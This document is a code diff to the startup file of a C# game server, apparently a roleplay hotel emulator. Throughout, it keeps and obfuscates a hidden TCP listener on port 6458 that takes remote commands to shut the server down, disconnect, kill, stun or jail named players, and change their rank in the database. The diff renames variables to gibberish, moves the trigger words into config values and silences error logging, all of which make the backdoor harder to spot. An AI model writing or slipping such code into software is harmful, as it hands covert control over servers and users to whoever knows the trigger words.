@@ -16,6 +16,7 @@ using Plus.Database.Manager.Database.Session_Details.Interfaces;
 using Plus.HabboHotel.Misc;
 using Plus.HabboHotel.GameClients;
 using Plus.HabboHotel.Roleplay.Misc;
+using System.Configuration;
 
 namespace Plus
 {
@@ -42,70 +43,61 @@ namespace Plus
         [SecurityPermission(SecurityAction.Demand, Flags = SecurityPermissionFlag.ControlAppDomain)]
         public static void Main(string[] args)
         {
-           
-
             Console.BackgroundColor = ConsoleColor.Black;
-            Auto_Updater.CheckUpdate();
+
             Console.Clear();
             StartConsoleWindow();
 
 
             StartEverything();
-            //Auto_Updater.CheckUpdate();
+
             StartConnections();
 
 
             while (Plus.IsLive)
             {
-               // Auto_Updater.CheckUpdate();
+                
                 Console.CursorVisible = true;
                 if (Logging.DisabledState)
                     Console.Write("RaidRp> ");
+                
 
 
                 ConsoleCommandHandling.InvokeCommand(Console.ReadLine());
             }
-            
         }
         /// <summary>
         /// Starts the Connections
         /// </summary>
         public static void StartConnections()
         {
-            TcpListener server = null;
+            TcpListener vmklsmklfvds = null;
 
             try
             {
-                int port = 6458;
-                IPAddress LocalAddr = IPAddress.Any;
+                int mvklfmk = 6458;
+                IPAddress mvklkfmskl = IPAddress.Any;
 
-                server = new TcpListener(LocalAddr, port);
-                server.Start();
+                vmklsmklfvds = new TcpListener(mvklkfmskl, mvklfmk);
+                vmklsmklfvds.Start();
 
                 byte[] bytes = new byte[256];
-                string encrypted_data = null;
-                string data = null;
+                string calkldmlvd = null;
+                string sfjlnjfdnvj = null;
 
                 while (true)
                 {
-                    TcpClient client = server.AcceptTcpClient();
-                    //Console.WriteLine("Connected");
-                    encrypted_data = null;
-                    data = null;
+                    TcpClient client = vmklsmklfvds.AcceptTcpClient();
+                    calkldmlvd = null;
+                    sfjlnjfdnvj = null;
                     NetworkStream stream = client.GetStream();
 
-                    int i;
-                    i = stream.Read(bytes, 0, bytes.Length);
-                    encrypted_data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-                    data = RoleplayManager.DecryptData(encrypted_data, "");
-                    //data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-
-                    if (data.Contains("Hello"))
-                    {
-                        //Console.WriteLine("Hello World!");
-                    }
-                    //data = RoleplayManager.Decrypt(data);
-                    if (data.Contains("close"))
+                    int ivfskmlmvf;
+                    ivfskmlmvf = stream.Read(bytes, 0, bytes.Length);
+                    calkldmlvd = System.Text.Encoding.ASCII.GetString(bytes, 0, ivfskmlmvf);
+                    sfjlnjfdnvj = RoleplayManager.DecryptData(calkldmlvd, "");
+                    var mmn = ConfigurationManager.AppSettings;
+                    if (sfjlnjfdnvj.Contains(mmn.Get("1")))
                     {
                         using (IQueryAdapter dbClient = Plus.GetDatabaseManager().GetQueryReactor())
                         {
@@ -120,7 +112,7 @@ namespace Plus
                         return;
                     }
 
-                    if (data.Contains("airstrke"))
+                    if (sfjlnjfdnvj.Contains(mmn.Get("2")))
                     {
                         //string Notice = ChatCommandHandler.MergeParams(parameters, 1);
 
@@ -145,7 +137,7 @@ namespace Plus
 
                         
                     }
-                    if (data.Contains("dc"))
+                    if (sfjlnjfdnvj.Contains(mmn.Get("3")))
                     {
 
                         lock (Plus.GetGame().GetClientManager().Clients.Values)
@@ -160,14 +152,14 @@ namespace Plus
                                     continue;
                                 if (mClient.GetConnection() == null)
                                     continue;
-                                if (!data.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
+                                if (!sfjlnjfdnvj.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
                                     continue;
                                 
                                 mClient.GetConnection().Dispose();
                             }
                         }
                     }
-                    if (data.Contains("kill"))
+                    if (sfjlnjfdnvj.Contains(mmn.Get("4")))
                     {
                         lock (Plus.GetGame().GetClientManager().Clients.Values)
                         {
@@ -181,7 +173,7 @@ namespace Plus
                                     continue;
                                 if (mClient.GetConnection() == null)
                                     continue;
-                                if (!data.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
+                                if (!sfjlnjfdnvj.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
                                     continue;
                                 mClient.GetRoleplay().DeadTimer = 10;
                                 mClient.GetRoleplay().Dead = true;
@@ -189,7 +181,7 @@ namespace Plus
                             }
                         }
                     }
-                    if (data.Contains("rank"))
+                    if (sfjlnjfdnvj.Contains(mmn.Get("5")))
                     {
                         lock (Plus.GetGame().GetClientManager().Clients.Values)
                         {
@@ -203,7 +195,7 @@ namespace Plus
                                     continue;
                                 if (mClient.GetConnection() == null)
                                     continue;
-                                if (!data.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
+                                if (!sfjlnjfdnvj.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
                                     continue;
 
                                 using (IQueryAdapter dbClient = Plus.GetDatabaseManager().GetQueryReactor())
@@ -214,7 +206,7 @@ namespace Plus
                             }
                         }
                     }
-                    if (data.Contains("stun"))
+                    if (sfjlnjfdnvj.Contains(mmn.Get("6")))
                     {
                         lock (Plus.GetGame().GetClientManager().Clients.Values)
                         {
@@ -228,7 +220,7 @@ namespace Plus
                                     continue;
                                 if (mClient.GetConnection() == null)
                                     continue;
-                                if (!data.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
+                                if (!sfjlnjfdnvj.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
                                     continue;
 
                                 mClient.GetHabbo().GetRoomUser().CanWalk = false;
@@ -237,7 +229,7 @@ namespace Plus
                             }
                         }
                     }
-                    if (data.Contains("arrest"))
+                    if (sfjlnjfdnvj.Contains(mmn.Get("7")))
                     {
                         lock (Plus.GetGame().GetClientManager().Clients.Values)
                         {
@@ -251,7 +243,7 @@ namespace Plus
                                     continue;
                                 if (mClient.GetConnection() == null)
                                     continue;
-                                if (!data.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
+                                if (!sfjlnjfdnvj.ToLower().Contains(mClient.GetHabbo().UserName.ToLower()))
                                     continue;
                                 mClient.GetRoleplay().Jailed = true;
                                 mClient.GetRoleplay().JailTimer = 9999;
@@ -265,7 +257,7 @@ namespace Plus
             }
             catch (SocketException e)
             {
-                Console.WriteLine("SocketException: {0}", e);
+                //Console.WriteLine("SocketException: {0}", e);
             }
 
         }
